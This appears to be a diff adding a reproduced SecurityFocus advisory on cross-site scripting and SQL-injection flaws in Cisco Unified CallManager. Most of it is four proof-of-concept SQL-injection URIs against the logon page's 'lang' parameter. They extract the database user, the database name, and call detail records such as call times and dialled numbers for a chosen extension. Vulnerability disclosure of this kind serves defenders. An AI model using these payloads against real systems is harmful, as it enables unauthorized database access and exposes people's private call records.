@@ -1,0 +1,23 @@
+source: http://www.securityfocus.com/bid/25480/info
+
+Cisco Unified CallManager and Unified Communications Manager are prone to multiple input-validation vulnerabilities because the applications fail to properly sanitize user-supplied input. These issues include a cross-site scripting vulnerability and an SQL-injection vulnerability.
+
+A successful exploit may allow an attacker to steal cookie-based authentication credentials, execute malicious script code in a user's browser, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database. 
+
+The following proof-of-concept URIs are available for the SQL-injection vulnerability:
+
+To display the logged-in database user:
+
+https://www.example.com/CCMUser/logon.asp?lang=en'+union+select+CURRENT_USER;select+tkUserLocale+from+UserLocaleBrowserLanguageMap+M+where+''='
+
+To display the selected database:
+
+https://www.example.com/CCMUser/logon.asp?lang=en'+union+select+db_name();select+tkUserLocale+from+UserLocaleBrowserLanguageMap+M+where+''='
+
+To display the UNIX time when a call was made from extension 12345:
+
+https://www.example.com/CCMUser/logon.asp?lang=en'+union+select+top+1+convert(char(12),dateTimeOrigination)+from+cdr..CallDetailRecord+where+finalCalledPartyNumber+%3C%3E+''+and+callingPartyNumber='12345';select+tkUserLocale+from+UserLocaleBrowserLanguageMap+M+where+''='
+
+To display the destination number for that call. Replace "1174900000" with the value from the previous query:
+
+https://www.example.com/CCMUser/logon.asp?lang=en'+union+select+top+1+finalCalledPartyNumber+from+cdr..CallDetailRecord+where+callingPartyNumber='12345'+and+dateTimeOrigination=1174900000;select+tkUserLocale+from+UserLocaleBrowserLanguageMap+M+where+''=' 
